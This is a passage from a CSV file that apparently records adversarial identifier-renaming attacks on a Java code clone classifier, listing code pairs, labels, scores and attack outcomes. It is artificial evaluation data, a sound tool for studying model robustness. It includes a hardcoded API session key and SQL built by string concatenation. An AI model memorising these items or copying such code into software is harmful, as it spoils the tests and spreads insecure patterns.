                int updstat = stbookifications.executeUpdate(agentpluginsql);
                if (updstat > 0) System.out.println(""agent bookings updated"");
            } else {
                otherbookQL += ""</detail>   as first into $new/book return  $new' ) where user_id like '"" + booking_details.getUserId() + ""'"";
                System.out.println(otherbookQL);
                stbookifications = conn.createStatement();
                int updstat = stbookifications.executeUpdate(otherbookQL);
                if (updstat > 0) System.out.println(""user bookings  updated"");
            }
        } catch (SQLException e) {
            conn.rollback();
            e.printStackTrace();
        }
    }
",LABEL_0,LABEL_0,0.5040581822395325,1,"Reserve,stbookings,stchartwl,sp,userbooksql,agentbooksql,bookingid,currentcoach,currentseat,tickpos,chartavailupdsql",,,,2,"Reserve:Reserve,stbookings:stbookifications,stchartwl:STchartowl,sp:ap,userbooksql:otherbookQL,agentbooksql:agentpluginsql,bookingid:bookingid,currentcoach: currentpoac,currentseat:activecourse,tickpos:tickPos,chartavailupdsql:chartavailupdssql,",2,GA,506,0.25913559198379515,ga,[]
22,"    protected String getFileContentAsString(String filePath, String encoding) throws IOException {
        URL testURL = Thread.currentThread().getContextClassLoader().getResource(filePath);
        InputStream input = null;
        StringWriter sw = new StringWriter();
        try {
            if (testURL != null) {
                input = testURL.openStream();
            } else {
                input = new FileInputStream(filePath);
            }
            IOUtils.copy(input, sw, encoding);
        } finally {
            if (input != null) {
                input.close();
            }
        }
        return sw.toString();
    }
 <SPLIT>     private void downloadFile(File target, String s3key) throws IOException, S3ServiceException {
        InputStream in = downloadData(s3key);
        if (in == null) {
            throw new IOException(""No data found"");
        }
        in = new InflaterInputStream(new CryptInputStream(in, cipher, getDataEncryptionKey()));
        File temp = File.createTempFile(""dirsync"", null);
        FileOutputStream fout = new FileOutputStream(temp);
        try {
            IOUtils.copy(in, fout);
            if (target.exists()) {
                target.delete();
            }
            IOUtils.closeQuietly(fout);
            IOUtils.closeQuietly(in);
            FileUtils.moveFile(temp, target);
        } catch (IOException e) {
            fetchStream(in);
            throw e;
        } finally {
            IOUtils.closeQuietly(fout);
            IOUtils.closeQuietly(in);
        }
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getFileContentAsString,filePath,encoding,testURL,input,sw",,,,0,,0,GA,2206,0.785305937131246,failed,[]
23,"    public synchronized String encrypt(String plaintext) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = null;
        md = MessageDigest.getInstance(""SHA"");
        md.update(plaintext.getBytes(""UTF-8""));
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     @Digester(forField = ""password"")
    public static String encriptPassword(String passwd) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(passwd.getBytes());
            BigInteger hash = new BigInteger(1, md.digest());
            return hash.toString(16);
        } catch (Exception e) {
            return null;
        }
    }
",75,,LABEL_1,LABEL_1,LABEL_1,-1,"encrypt,plaintext,UnsupportedEncodingException,md,raw,hash",,,,0,,0,GA,1689,0.5992275953292847,failed,[]
24,"    public Long split(File targetDirectory, String prefix, long maxUnitBases, long maxUnitEntries) throws Exception {
        if (!targetDirectory.exists()) {
            if (!targetDirectory.mkdirs()) throw new Exception(""Could not create target directory "" + targetDirectory.getAbsolutePath());
        }
        if (!size.isUnknown() && size.getBases() < maxUnitBases && (maxUnitEntries <= 0 || size.getEntries() < maxUnitEntries)) {
            FileInputStream fis = new FileInputStream(this);
            FileChannel fci = fis.getChannel();
            FileOutputStream fos = new FileOutputStream(new File(targetDirectory, prefix + ""_0"" + "".fasta""));
            FileChannel fco = fos.getChannel();
            ByteBuffer buffer = ByteBuffer.allocate(64000);
            while (fci.read(buffer) > 0) {
                buffer.flip();
                fco.write(buffer);
                buffer.clear();
            }
            fci.close();
            fco.close();
            return (long) 1;
        } else {
            long currentBasesCount = 0;
            long currentEntriesCount = 0;
            int targetCount = 0;
            FileChannel fastaChannel = new FileInputStream(this).getChannel();
            int totalSeqCount = 0;
            long totalResiduesCount = 0;
            try {
                long prevTime = System.currentTimeMillis();
                long fastaFileSize = this.length();
                long fastaFileReadOffset = 0L;
                long partitionStartOffset = 0L;
                final int bufferSize = 1024 * 1024;
                ByteBuffer fastaBuffer = ByteBuffer.allocateDirect(bufferSize);
                int fastaReadState = FASTAFileTokenizer.UNKNOWN;
                for (; fastaFileReadOffset < fastaFileSize; ) {
                    long nBytes = fastaChannel.read(fastaBuffer);
                    if (nBytes <= 0) {
                        fastaBuffer.limit(0);
                        break;
                    } else {
                        fastaBuffer.flip();
                        fastaFileReadOffset += nBytes;
                    }
                    for (; ; ) {
                        if (!fastaBuffer.hasRemaining()) {
                            fastaBuffer.clear();
                            break;
                        }
                        int b = fastaBuffer.get();
                        if (b == '\r') {
                        } else if (b == '\n') {
                            if (fastaReadState == FASTAFileTokenizer.DEFLINE) {
                                fastaReadState = FASTAFileTokenizer.SEQUENCELINE;
                            }
                        } else if (b == '>') {
                            if (fastaReadState == FASTAFileTokenizer.UNKNOWN) {
                                fastaReadState = FASTAFileTokenizer.STARTDEFLINE;
                            } else if (fastaReadState == FASTAFileTokenizer.SEQUENCELINE) {
                                fastaReadState = FASTAFileTokenizer.STARTDEFLINE;
                            }
                            if (fastaReadState == FASTAFileTokenizer.STARTDEFLINE) {
                                if (currentBasesCount >= maxUnitBases || maxUnitEntries > 0 && currentEntriesCount >= maxUnitEntries) {
                                    fastaBuffer.position(fastaBuffer.position() - 1);
                                    long currentTime = System.currentTimeMillis();
                                    System.out.println(new java.util.Date() + "" Partition "" + targetCount + "" containing "" + currentEntriesCount + "" sequences and "" + currentBasesCount + "" residues ends at "" + (fastaFileReadOffset - fastaBuffer.remaining()) + "" and was created in "" + (currentTime - prevTime) + "" ms"");
                                    prevTime = currentTime;
                                    long partitionEndOffset = fastaFileReadOffset - fastaBuffer.remaining();
                                    FileChannel partitionChannel = new FileOutputStream(new File(targetDirectory, prefix + ""_"" + targetCount + "".fasta"")).getChannel();
                                    nBytes = fastaChannel.transferTo(partitionStartOffset, partitionEndOffset - partitionStartOffset, partitionChannel);
                                    partitionChannel.force(true);
                                    partitionChannel.close();
                                    targetCount++;
                                    partitionStartOffset += nBytes;
                                    currentBasesCount = 0;
                                    currentEntriesCount = 0;
                                    fastaReadState = FASTAFileTokenizer.UNKNOWN;
                                } else {
                                    fastaReadState = FASTAFileTokenizer.DEFLINE;
                                    currentEntriesCount++;
                                }
                                totalSeqCount++;
                            }
                        } else {
                            if (fastaReadState == FASTAFileTokenizer.SEQUENCELINE) {
                                totalResiduesCount++;
                                currentBasesCount++;
                            }
                        }
                    }
                }
                if (partitionStartOffset < fastaFileSize) {
                    long currentTime = System.currentTimeMillis();
                    System.out.println(new java.util.Date() + "" Partition "" + targetCount + "" containing "" + currentEntriesCount + "" sequences and "" + currentBasesCount + "" residues ends at "" + (fastaFileSize) + "" and was created in "" + (currentTime - prevTime) + "" ms"");
                    FileChannel partitionChannel = new FileOutputStream(new File(targetDirectory, prefix + ""_"" + targetCount + "".fasta"")).getChannel();
                    fastaChannel.transferTo(partitionStartOffset, fastaFileSize - partitionStartOffset, partitionChannel);
                    partitionChannel.force(true);
                    partitionChannel.close();
                    targetCount++;
                }
                if (size.isUnknown()) {
                    size.setBases(totalResiduesCount);
                    size.setEntries(totalSeqCount);
                }
            } finally {
                fastaChannel.close();
            }
            return (long) targetCount;
        }
    }
 <SPLIT>     public List load(String sourceType, Object source, String param) throws Exception {
        if (log.isTraceEnabled()) {
            log.trace(""load "" + source);
        }
        String location = null;
        String type = null;
        Object inputsource = null;
        if (source instanceof DynamicMBean) {
            sourceType = ""MbeansDescriptorsDynamicMBeanSource"";
            inputsource = source;
        } else if (source instanceof URL) {
            URL url = (URL) source;
            location = url.toString();
            type = param;
            inputsource = url.openStream();
            if (sourceType == null) {
                sourceType = sourceTypeFromExt(location);
            }
        } else if (source instanceof File) {
            location = ((File) source).getAbsolutePath();
            inputsource = new FileInputStream((File) source);
            type = param;
            if (sourceType == null) {
                sourceType = sourceTypeFromExt(location);
            }
        } else if (source instanceof InputStream) {
            type = param;
            inputsource = source;
        } else if (source instanceof Class) {
            location = ((Class) source).getName();
            type = param;
            inputsource = source;
            if (sourceType == null) {
                sourceType = ""MbeansDescriptorsIntrospectionSource"";
            }
        }
        if (sourceType == null) {
            sourceType = ""MbeansDescriptorsDigesterSource"";
        }
        ModelerSource ds = getModelerSource(sourceType);
        List mbeans = ds.loadDescriptors(this, location, type, inputsource);
        return mbeans;
    }
",862,,LABEL_0,LABEL_1,,-4,"split,targetDirectory,prefix,maxUnitBases,maxUnitEntries,fis,fci,fos,fco,buffer,currentBasesCount,currentEntriesCount,targetCount,fastaChannel,totalSeqCount,totalResiduesCount,prevTime,fastaFileSize,fastaFileReadOffset,partitionStartOffset,bufferSize,fastaBuffer,fastaReadState,nBytes",,,,0,,0,Greedy,1,0.0010589400927225748,,[]
25,"    public boolean deleteRoleType(int id, int namespaceId, boolean removeReferencesInRoleTypes, DTSPermission permit) throws SQLException, PermissionException, DTSValidationException {
        checkPermission(permit, String.valueOf(namespaceId));
        boolean exist = isRoleTypeUsed(namespaceId, id);
        if (exist) {
            throw new DTSValidationException(ApelMsgHandler.getInstance().getMsg(""DTS-0034""));
        }
        if (!removeReferencesInRoleTypes) {
            StringBuffer msgBuf = new StringBuffer();
            DTSTransferObject[] objects = fetchRightIdentityReferences(namespaceId, id);
            if (objects.length > 0) {
                msgBuf.append(""Role Type is Right Identity in one or more Role Types."");
            }
            objects = fetchParentReferences(namespaceId, id);
            if (objects.length > 0) {
                if (msgBuf.length() > 0) {
                    msgBuf.append(""\n"");
                }
                msgBuf.append(""Role Type is Parent of one or more Role Types."");
            }
            if (msgBuf.length() > 0) {
                throw new DTSValidationException(msgBuf.toString());
            }
        }
        String sqlRightId = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE_RIGHT_IDENTITY_REF"");
        String sqlParent = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE_PARENT_REF"");
        String sql = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE"");
        PreparedStatement pstmt = null;
        boolean success = false;
        long typeGid = getGID(namespaceId, id);
        conn.setAutoCommit(false);
        int defaultLevel = conn.getTransactionIsolation();
        conn.setTransactionIsolation(Connection.TRANSACTION_READ_COMMITTED);
        try {
            pstmt = conn.prepareStatement(sqlRightId);
            pstmt.setLong(1, typeGid);
            pstmt.executeUpdate();
            pstmt.close();
            pstmt = conn.prepareStatement(sqlParent);
            pstmt.setLong(1, typeGid);
            pstmt.executeUpdate();
            pstmt.close();
            pstmt = conn.prepareStatement(sql);
            pstmt.setLong(1, typeGid);
            int count = pstmt.executeUpdate();
            success = (count == 1);
            conn.commit();
        } catch (SQLException e) {
            conn.rollback();
            throw e;
        } finally {
            conn.setTransactionIsolation(defaultLevel);
            conn.setAutoCommit(true);
            closeStatement(pstmt);
        }
        return success;
    }
 <SPLIT>     @Override
    public boolean insert(String consulta, boolean autocommit, int transactionIsolation, Connection cx) throws SQLException {
        filasInsert = 0;
        if (!consulta.contains("";"")) {
            this.tipoConsulta = new Scanner(consulta);
            if (this.tipoConsulta.hasNext()) {
                execConsulta = this.tipoConsulta.next();
                if (execConsulta.equalsIgnoreCase(""insert"")) {
                    Connection conexion = cx;
                    Statement st = null;
                    try {
                        conexion.setAutoCommit(autocommit);
                        if (transactionIsolation == 1 || transactionIsolation == 2 || transactionIsolation == 4 || transactionIsolation == 8) {
                            conexion.setTransactionIsolation(transactionIsolation);
                        } else {
                            throw new IllegalArgumentException(""Valor invalido sobre TransactionIsolation,\n TRANSACTION_NONE no es soportado por MySQL"");
                        }
                        st = (Statement) conexion.createStatement(ResultSetImpl.TYPE_SCROLL_SENSITIVE, ResultSetImpl.CONCUR_UPDATABLE);
                        conexion.setReadOnly(false);
                        filasInsert = st.executeUpdate(consulta.trim(), Statement.RETURN_GENERATED_KEYS);
                        if (filasInsert > -1) {
                            if (autocommit == false) {
                                conexion.commit();
                            }
                            return true;
                        } else {
                            return false;
                        }
                    } catch (MySQLIntegrityConstraintViolationException e) {
                        System.out.println(""Posible duplicacion de DATOS"");
                        if (autocommit == false) {
                            try {
                                conexion.rollback();
                                System.out.println(""Se ejecuto un Rollback"");
                            } catch (MySQLTransactionRollbackException sqlE) {
                                System.out.println(""No se ejecuto un Rollback"");
                                sqlE.printStackTrace();
                            } catch (SQLException se) {
                                se.printStackTrace();
                            }
                        }
                        e.printStackTrace();
                        return false;
                    } catch (MySQLNonTransientConnectionException e) {
                        if (autocommit == false) {
                            try {
                                conexion.rollback();
                                System.out.println(""Se ejecuto un Rollback"");
                            } catch (MySQLTransactionRollbackException sqlE) {
                                System.out.println(""No se ejecuto un Rollback"");
                                sqlE.printStackTrace();
                            } catch (SQLException se) {
                                se.printStackTrace();
                            }
                        }
                        e.printStackTrace();
                        return false;
                    } catch (MySQLDataException e) {
                        System.out.println(""Datos incorrectos"");
                        if (autocommit == false) {
                            try {
                                conexion.rollback();
                                System.out.println(""Se ejecuto un Rollback"");
                            } catch (MySQLTransactionRollbackException sqlE) {
                                System.out.println(""No se ejecuto un Rollback"");
                                sqlE.printStackTrace();
                            } catch (SQLException se) {
                                se.printStackTrace();
                            }
                        }
                        return false;
                    } catch (MySQLSyntaxErrorException e) {
                        System.out.println(""Error en la sintaxis de la Consulta en MySQL"");
                        if (autocommit == false) {
                            try {
                                conexion.rollback();
                                System.out.println(""Se ejecuto un Rollback"");
                            } catch (MySQLTransactionRollbackException sqlE) {
                                System.out.println(""No se ejecuto un Rollback"");
                                sqlE.printStackTrace();
                            } catch (SQLException se) {
                                se.printStackTrace();
                            }
                        }
                        return false;
                    } catch (SQLException e) {
                        if (autocommit == false) {
                            try {
                                conexion.rollback();
                                System.out.println(""Se ejecuto un Rollback"");
                            } catch (MySQLTransactionRollbackException sqlE) {
                                System.out.println(""No se ejecuto un Rollback"");
                                sqlE.printStackTrace();
                            } catch (SQLException se) {
                                se.printStackTrace();
                            }
                        }
                        e.printStackTrace();
                        return false;
                    } finally {
                        try {
                            if (st != null) {
                                if (!st.isClosed()) {
                                    st.close();
                                }
                            }
                            if (!conexion.isClosed()) {
                                conexion.close();
                            }
                        } catch (NullPointerException ne) {
                            ne.printStackTrace();
                        } catch (SQLException e) {
                            e.printStackTrace();
                        }
                    }
                } else {
                    throw new IllegalArgumentException(""No es una instruccion Insert"");
                }
            } else {
                try {
                    throw new JMySQLException(""Error Grave , notifique al departamento de Soporte Tecnico \n"" + email);
                } catch (JMySQLException ex) {
                    Logger.getLogger(JMySQL.class.getName()).log(Level.SEVERE, null, ex);
                    return false;
                }
            }
        } else {
            throw new IllegalArgumentException(""No estan permitidas las MultiConsultas en este metodo"");
        }
    }
",427,,LABEL_1,LABEL_0,,-4,"deleteRoleType,id,namespaceId,removeReferencesInRoleTypes,permit,exist,msgBuf,objects,sqlRightId,sqlParent,sql,pstmt,typeGid,defaultLevel,success",,,,0,,0,Greedy,1,0.0009675820668538412,,[]
26,"    synchronized List<String> getDatasetsList(String surl) {
        if (datasetsList == null) {
            datasetsList = new HashMap<String, List<String>>();
        }
        List<String> result = datasetsList.get(surl);
        if (result == null) {
            BufferedReader reader = null;
            try {
                URL url = new URL(surl + ""?server=list"");
                reader = new BufferedReader(new InputStreamReader(url.openStream()));
                String s = reader.readLine();
                ArrayList<String> list = new ArrayList<String>();
                while (s != null) {
                    list.add(s);
                    s = reader.readLine();
                }
                datasetsList.put(surl, list);
            } catch (IOException ex) {
                Logger.getLogger(Das2ServerDataSourceFactory.class.getName()).log(Level.SEVERE, null, ex);
                throw new RuntimeException(ex);
            } finally {
                try {
                    reader.close();
                } catch (IOException ex) {
                    Logger.getLogger(Das2ServerDataSourceFactory.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
        return datasetsList.get(surl);
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String version = null;
            String build = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".version"")) version = line.substring(8).trim(); else if (line.startsWith("".build"")) build = line.substring(6).trim();
            }
            bin.close();
            if (version != null && build != null) {
                if (jEdit.getBuild().compareTo(build) < 0) newVersionAvailable(view, version, url); else {
                    GUIUtilities.message(view, ""version-check"" + "".up-to-date"", new String[0]);
                }
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",238,,LABEL_1,LABEL_1,LABEL_1,-1,"getDatasetsList,surl,datasetsList,result,reader,url,s,list",,,,0,,0,GA,2838,1.043512499332428,failed,[]
27,"        public void copy(File s, File t) throws IOException {
            FileChannel in = (new FileInputStream(s)).getChannel();
            FileChannel out = (new FileOutputStream(t)).getChannel();
            in.transferTo(0, s.length(), out);
            in.close();
            out.close();
        }
 <SPLIT>     public static void copyFile(File srcFile, File destFile) throws IOException {
        logger.debug(""copyFile(srcFile={}, destFile={}) - start"", srcFile, destFile);
        FileChannel srcChannel = new FileInputStream(srcFile).getChannel();
        FileChannel dstChannel = new FileOutputStream(destFile).getChannel();
        try {
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        } finally {
            srcChannel.close();
            dstChannel.close();
        }
    }
",72,"        public void io(File s, File g) throws IOException {
            FileChannel url = (new FileInputStream(s)).getChannel();
            FileChannel user = (new FileOutputStream(g)).getChannel();
            url.transferTo(0, s.length(), user);
            url.close();
            user.close();
        }
",LABEL_1,LABEL_1,0.5386977195739746,1,"copy,s,t,in,out",,,,3,"copy:io,s:s,t:g,in:url,out:user,",1,GA,316,0.11195390224456787,ga,[]
28,"    public static byte[] fetchURLData(String url, String proxyHost, int proxyPort) throws IOException {
        HttpURLConnection con = null;
        InputStream is = null;
        try {
            URL u = new URL(url);
            if (url.startsWith(""file://"")) {
                is = new BufferedInputStream(u.openStream());
            } else {
                Proxy proxy;
                if (proxyHost != null) {
                    proxy = new Proxy(Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                } else {
                    proxy = Proxy.NO_PROXY;
                }
                con = (HttpURLConnection) u.openConnection(proxy);
                con.addRequestProperty(""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"");
                con.addRequestProperty(""Accept-Charset"", ""UTF-8"");
                con.addRequestProperty(""Accept-Language"", ""en-US,en"");
                con.addRequestProperty(""Accept"", ""text/html,image/*"");
                con.setDoInput(true);
                con.setDoOutput(false);
                con.connect();
                is = new BufferedInputStream(con.getInputStream());
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            IOUtils.copy(is, baos);
            return baos.toByteArray();
        } finally {
            IOUtils.closeQuietly(is);
            if (con != null) {
                con.disconnect();
            }
        }
    }
 <SPLIT>     public static void main(String[] args) throws Exception {
        int result = 20;
        if (args.length == 1) {
            StringBuffer urlString = new StringBuffer(args[0]);
            if (urlString.lastIndexOf(""/"") != urlString.length() - 1) {
                urlString.append('/');
            }
            urlString.append(""GetConfig.jsp"");
            URLConnection conn = new URL(urlString.toString()).openConnection();
            System.out.println(Configuration.readObject(conn.getInputStream()));
            result = 0;
        } else {
            System.err.println(""usage: GetConfig <URL>"");
        }
        System.exit(result);
    }
",253,,LABEL_0,LABEL_0,LABEL_0,-1,"fetchURLData,url,proxyHost,proxyPort,con,is,u,proxy,baos",,,,0,,0,GA,3383,1.2333855827649434,failed,[]
29,"    public boolean crear() {
        int result = 0;
        String sql = ""insert into jugador"" + ""(apellidoPaterno, apellidoMaterno, nombres, fechaNacimiento, pais, rating, sexo)"" + ""values (?, ?, ?, ?, ?, ?, ?)"";
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            populatePreparedStatement(elJugador);
            result = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (result > 0);
    }
 <SPLIT>     public void getHttpURL() throws Exception {
        boolean display = true;
        boolean allHeaders = false;
        String url = null;
        url = ""http://localhost/cubigraf2"";
        url = ""http://www.accenture.com/NR/rdonlyres/971C4EEE-24E2-4BAA-8C7B-D5A5133D5968/0/en_sprout.jpg"";
        url = ""http://www.uni.pt/img/home-direito.gif"";
        url = ""http://www.google.com"";
        URLConnection uc = new URL(url).openConnection();
        println(""HEADERS:"");
        if (allHeaders) {
            Iterator<Map.Entry<String, List<String>>> itHeaders = uc.getHeaderFields().entrySet().iterator();
            while (itHeaders.hasNext()) {
                Map.Entry<String, List<String>> e = itHeaders.next();
                Iterator<?> itValues = e.getValue().iterator();
                while (itValues.hasNext()) {
                    println(e.getKey() + "": "" + itValues.next());
                }
            }
        } else {
            showObjectProperty(uc, ""getContentEncoding"");
            showObjectProperty(uc, ""getContentLength"");
            showObjectProperty(uc, ""getContentType"");
            showObjectProperty(uc, ""getDate"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getExpiration"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getLastModified"", FORMAT.TIMESTAMP);
        }
        ExtendedInputStream in = new ExtendedInputStream(uc.getInputStream(), url.toString());
        if (display) {
            println(""BODY:"");
            ExtendedReader reader = new ExtendedReader(in);
            for (String s = reader.readLine(); s != null; s = reader.readLine()) {
                println(s);
            }
        } else {
            println(""(BODY saved to a file)"");
            String contentType = uc.getContentType();
            StringBuilder filename = new StringBuilder(""C:\\Documents and Settings\\Carlos_da_S_Pereira\\Desktop\\JAVA_NET_TESTS"");
            filename.append(""."");
            filename.append(contentType.substring(contentType.indexOf(""/"") + 1));
            File file = new File(filename.toString());
            ExtendedOutputStream out = new ExtendedOutputStream(new FileOutputStream(file), file.getAbsolutePath());
            Streams.copy(in, out);
            out.close();
        }
        in.close();
    }
",133,,LABEL_0,LABEL_0,LABEL_0,-1,"crear,result,sql,connection,ps",,,,0,,0,GA,789,0.30125267108281456,failed,[]
30,"    public static Properties load(String propsName) {
        Properties props = new Properties();
        URL url = ClassLoader.getSystemResource(propsName);
        try {
            props.load(url.openStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
        return props;
    }
 <SPLIT>     public static void main(String[] args) throws IOException {
        PostParameter a1 = new PostParameter(""v"", Utils.encode(""1.0""));
        PostParameter a2 = new PostParameter(""api_key"", Utils.encode(RenRenConstant.apiKey));
        PostParameter a3 = new PostParameter(""method"", Utils.encode(""feed.publishTemplatizedAction""));
        PostParameter a4 = new PostParameter(""call_id"", System.nanoTime());
        PostParameter a5 = new PostParameter(""session_key"", Utils.encode(""5.b2ca405eef80b4da1f68d0df64e471be.86400.1298372400-350727914""));
        PostParameter a8 = new PostParameter(""format"", Utils.encode(""JSON""));
        PostParameter a9 = new PostParameter(""template_id"", Utils.encode(""1""));
        PostParameter a10 = new PostParameter(""title_data"", Utils.encode(""\""conteng\"":\""xkt\""""));
        PostParameter a11 = new PostParameter(""body_data"", Utils.encode(""\""conteng\"":\""xkt\""""));
        RenRenPostParameters ps = new RenRenPostParameters(Utils.encode(RenRenConstant.secret));
        ps.addParameter(a1);
        ps.addParameter(a2);
        ps.addParameter(a3);
        ps.addParameter(a4);
        ps.addParameter(a5);
        ps.addParameter(a8);
        ps.addParameter(a9);
        ps.addParameter(a10);
        ps.addParameter(a11);
        System.out.println(RenRenConstant.apiUrl + ""?"" + ps.generateUrl());
        URL url = new URL(RenRenConstant.apiUrl + ""?"" + ps.generateUrl());
        HttpURLConnection request = (HttpURLConnection) url.openConnection();
        request.setDoOutput(true);
        request.setRequestMethod(""POST"");
        System.out.println(""Sending request..."");
        request.connect();
        System.out.println(""Response: "" + request.getResponseCode() + "" "" + request.getResponseMessage());
        BufferedReader reader = new BufferedReader(new InputStreamReader(request.getInputStream()));
        String b = null;
        while ((b = reader.readLine()) != null) {
            System.out.println(b);
        }
    }
",59,,LABEL_0,LABEL_0,LABEL_0,-1,"load,propsName,props,url",,,,0,,0,GA,1324,0.48483957052230836,failed,[]
31,"    public static void polishOff(IProgressMonitor monitor, String from, String to, String renameTo) {
        if (monitor != null && monitor.isCanceled()) {
            return;
        }
        try {
            ftpClient = new FTPClient();
            ftpClient.setRemoteAddr(InetAddress.getByName(PrefPageOne.getValue(CONSTANTS.PREF_HOST)));
            ftpClient.setControlPort(PrefPageOne.getIntValue(CONSTANTS.PREF_FTPPORT));
            ftpClient.connect();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            ftpClient.login((PrefPageOne.getValue(CONSTANTS.PREF_USERNAME)), FTPUtils.decrypt(PrefPageOne.getValue(CONSTANTS.PREF_PASSWORD)));
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (from != null) {
                FTPHolder ftpHolder = new FTPHolder(from, to, renameTo, false);
                synchedSet.add(ftpHolder);
            }
            JobHandler.aquireFTPLock();
            for (Iterator iter = synchedSet.iterator(); iter.hasNext(); ) {
                if (monitor != null && monitor.isCanceled()) {
                    JobHandler.releaseFTPLock();
                    ftpClient.quit();
                    return;
                }
                Thread.yield();
                FTPHolder element = (FTPHolder) iter.next();
                ftpClient.setType(FTPTransferType.ASCII);
                ftpClient.put(element.from, element.to);
                if (element.renameTo != null) {
                    try {
                        ftpClient.delete(element.renameTo);
                    } catch (Exception e) {
                    }
                    ftpClient.rename(element.to, element.renameTo);
                    log.info(""RENAME: "" + element.to + ""To: "" + element.renameTo);
                }
            }
            JobHandler.releaseFTPLock();
            ftpClient.quit();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (FTPException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        synchedSet.clear();
    }
 <SPLIT>     private static void copyFile(String src, String target) throws IOException {
        FileChannel ic = new FileInputStream(src).getChannel();
        FileChannel oc = new FileOutputStream(target).getChannel();
        ic.transferTo(0, ic.size(), oc);
        ic.close();
        oc.close();
    }
",405,,LABEL_0,LABEL_0,LABEL_0,-1,"polishOff,monitor,from,to,renameTo,ftpClient,ftpHolder,iter,element",,,,0,,0,GA,3614,1.3456245223681131,failed,[]
32,"    protected File EncodeReturn() throws EncodeFailedException, IOException {
        CryptoClient c = getNode().getCryptoClientByID(PiggybackCrypto);
        File tmpf = getNode().getTempFM().createNewFile(""encodereturn"", ""download"");
        ChannelWriter cw = new ChannelWriter(tmpf);
        cw.putLongFile(DownloadData);
        cw.close();
        File encdata = c.RawEncode(tmpf, RawKey);
        File pigdata = PigData.EncodeData(encdata);
        File pigroute = ReturnPigRoute.EncodeData(ReturnRouteFile);
        FileOutputStream fos = new FileOutputStream(pigroute, true);
        FileChannel foc = fos.getChannel();
        FileInputStream fis = new FileInputStream(pigdata);
        FileChannel fic = fis.getChannel();
        fic.transferTo(0, fic.size(), foc);
        foc.close();
        fic.close();
        pigdata.delete();
        ReturnRouteFile.delete();
        encdata.delete();
        return pigroute;
    }
 <SPLIT>     public byte[] getResponse() {
        final ByteArrayInputStream bais = new ByteArrayInputStream(request);
        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
        List<String> lines = Collections.emptyList();
        try {
            @SuppressWarnings(""unchecked"") List<String> dl = IOUtils.readLines(bais);
            lines = dl;
        } catch (IOException ioex) {
            throw new AssertionError(ioex);
        }
        String resource = null;
        for (String line : lines) {
            if (line.startsWith(""GET "")) {
                int endIndex = line.lastIndexOf(' ');
                resource = line.substring(4, endIndex);
            }
        }
        final PrintStream printStream = new PrintStream(baos);
        if (resource == null) {
            printStream.println(""HTTP/1.1 400 Bad Request"");
        } else {
            final InputStream inputStream = getClass().getResourceAsStream(resource);
            if (inputStream == null) {
                printStream.println(""HTTP/1.1 404 Not Found"");
                printStream.println();
            } else {
                printStream.println(""HTTP/1.1 200 OK"");
                printStream.println();
                try {
                    IOUtils.copy(inputStream, printStream);
                } catch (IOException ioex) {
                    throw new AssertionError(ioex);
                }
            }
        }
        printStream.flush();
        printStream.close();
        return baos.toByteArray();
    }
",187,,LABEL_1,LABEL_1,LABEL_1,-1,"EncodeReturn,IOException,c,tmpf,cw,encdata,pigdata,pigroute,fos,foc,fis,fic",,,,0,,0,GA,4202,1.5384368658065797,failed,[]
33,"    static File copy(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
            return out;
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     private static String encode(final String input) throws UnsupportedEncodingException, NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.reset();
        md.update(input.getBytes(""UTF-8""));
        return toHexString(md.digest());
    }
",99,,LABEL_0,LABEL_0,LABEL_0,-1,"copy,in,out,inChannel,outChannel",,,,0,,0,GA,1855,0.65281955798467,failed,[]
34,"    protected String getFileContentAsString(String filePath, String encoding) throws IOException {
        URL testURL = Thread.currentThread().getContextClassLoader().getResource(filePath);
        InputStream input = null;
        StringWriter sw = new StringWriter();
        try {
            if (testURL != null) {
                input = testURL.openStream();
            } else {
                input = new FileInputStream(filePath);
            }
            IOUtils.copy(input, sw, encoding);
        } finally {
            if (input != null) {
                input.close();
            }
        }
        return sw.toString();
    }
 <SPLIT>     private void copyFileTo(File destination) throws IOException {
        logger.fine(""Copying from "" + destination + ""..."");
